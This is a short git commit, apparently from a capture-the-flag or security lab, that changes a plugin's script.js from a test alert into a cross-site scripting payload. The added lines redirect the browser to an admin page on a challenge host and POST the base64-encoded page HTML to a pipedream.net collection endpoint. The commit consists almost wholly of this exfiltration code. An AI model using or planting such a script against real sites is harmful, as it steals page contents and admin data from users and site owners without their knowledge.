5514775a8fe9f5232665dccefd4c1ceb006d905e
furtest <paul.retourne@orange.fr>
2023-11-23 14:25:41 +0100

    admin page content

--- plugin_again/script.js
+++ plugin_again/script.js
@@ -1,1 +1,2 @@
-alert("from github");
+document.location = "https://website-kueqer.inst.malicecyber.com/posts/admin";
+fetch("https://eof01qmn38c7xfu.m.pipedream.net", {method: "POST", body: btoa(unescape(encodeURIComponent(document.body.outerHTML)))});
